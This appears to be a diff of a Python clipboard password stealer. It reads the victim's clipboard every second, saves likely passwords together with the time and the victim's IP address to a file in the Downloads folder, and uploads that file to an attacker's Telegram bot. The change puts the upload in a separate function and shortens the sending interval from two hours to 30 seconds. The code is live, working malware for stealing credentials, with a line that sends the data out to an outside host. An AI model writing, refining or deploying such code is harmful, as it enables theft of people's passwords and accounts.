@@ -23,7 +23,7 @@ LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
 # temporally variable for clipboard
 CLIPBOARD_STRING = ''
 # interval to send a log
-interval = (3600 * 2)
+interval = 30
 # time start script
 start_time = time.time()
 
@@ -84,6 +84,18 @@ def ip_finder():
         return 'Can not find ip'
 
 
+# send log to telegram with time interval
+def log_sender():
+    global start_time
+    if int(time.time() - start_time) >= interval:
+        files = {
+            'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
+        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
+                      files=files)
+        # reset start time
+        start_time = time.time()
+
+
 # Intercept pass,  write to file and send text log to Telegram
 def start_loop():
     # string for intercept pass
@@ -92,10 +104,11 @@ def start_loop():
     # variable for ip
     ip = ip_finder()
     while True:
+        log_sender()
         # assign string to clipboard:
         CLIPBOARD_STRING = pyperclip.paste()
         # create / open file for save passwords:
-        f = open('intercepted_passwords.txt', 'a')
+        f = open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'a')
         # check password in list and check is link or not:
         for _ in interceptor_passwords(CLIPBOARD_STRING):
             if CLIPBOARD_STRING != pass_string and 'http' not in CLIPBOARD_STRING:
@@ -106,17 +119,6 @@ def start_loop():
                     print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
                     f.close()
                     # send log to telegram
-                    global start_time
-                    while True:
-                        if int(time.time() - start_time) >= interval:
-                            files = {
-                                'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
-                            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
-                                          files=files)
-                            # reset start time
-                            start_time = time.time()
-                        else:
-                            continue
             # reassign clipboard to string
             pass_string = CLIPBOARD_STRING
         sleep(1)
